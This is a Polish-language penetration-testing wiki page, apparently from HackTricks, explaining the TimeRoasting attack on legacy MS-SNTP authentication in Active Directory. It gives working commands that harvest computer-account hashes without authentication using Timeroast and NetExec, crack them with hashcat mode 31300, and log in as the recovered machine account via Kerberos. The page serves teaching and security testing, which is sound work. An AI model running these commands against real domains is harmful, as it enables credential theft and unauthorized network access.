# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting wykorzystuje uwierzytelnianie legacy MS-SNTP. Nieuwierzytelniony klient może wysłać żądanie o długości 68 bajtów zawierające wybrany RID konta komputera. W podatnej ścieżce legacy kontroler domeny wyprowadza authenticator odpowiedzi za pośrednictwem Netlogon, używając hasha NT konta komputera (sekretu hasła wyprowadzonego za pomocą MD4), co daje atakującemu parę challenge/MAC odpowiednią do offline'owego zgadywania hasła (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Sekcje 3.1.5.1 i 4 dokumentu MS-SNTP opisują zachowanie żądania i odpowiedzi:<sup>[[1]](#references)</sup>
![TimeRoasting: Szczegółowe informacje znajdują się w sekcji 3.1.5.1 „Authentication Request Behavior” oraz 4 „Protocol Examples” oficjalnej specyfikacji MS-SNTP](../../images/Pasted%20image%2020250709114508.png)
Gdy `ExtendedAuthenticatorSupported` ma wartość false, żądanie przechowuje RID w dolnych 31 bitach Key Identifier authenticatora oraz bit selektora w najwyższym bicie. Serwer weryfikuje długość 68 bajtów, wyodrębnia RID, prosi Netlogon o obliczenie kandydujących sum kontrolnych, wybiera jedną z nich przy użyciu najwyższego bitu, zeruje Key Identifier odpowiedzi i zwraca wybraną sumę kontrolną.<sup>[[1]](#references)</sup>

Suma kontrolna kryptograficzna bazuje na MD5 (zobacz 3.2.5.1.1) i może zostać złamana offline, co umożliwia atak roastingowy.<sup>[[1]](#references)</sup>

## Jak przeprowadzić atak

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - skrypty do Timeroasting autorstwa Toma Tervoorta<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktyczny atak (unauth) z użyciem NetExec + Hashcat

- Moduł `timeroast` w NetExec może wyliczać RID-y komputerów, zbierać MAC-i MS-SNTP bez uwierzytelniania oraz wyświetlać hashe `$sntp-ms$` gotowe do crackowania:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Łamanie offline za pomocą trybu 31300 Hashcat (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Odzyskany tekst jawny odpowiada hasłu konta komputera. Spróbuj użyć go bezpośrednio jako konto komputera za pomocą Kerberos (-k), gdy NTLM jest wyłączone:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Uwagi operacyjne
- Zapewnij prawidłowy czas przed użyciem odzyskanych danych uwierzytelniających z Kerberos. Preferuj utrzymywanego klienta NTP, takiego jak `chronyd`/`systemd-timesyncd`; `ntpdate` pozostawiono tutaj jako typowe polecenie laboratoryjne: `sudo ntpdate <dc_fqdn>`.
- W razie potrzeby wygeneruj krb5.conf dla realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Później mapuj identyfikatory RID na principals za pośrednictwem LDAP/BloodHound, gdy uzyskasz dowolny uwierzytelniony foothold.

## References

- [1] [MS-SNTP: Prosty protokół czasu sieciowego firmy Microsoft](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper dotyczący Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — źródło modułu `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Tryb 31300 Hashcat – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
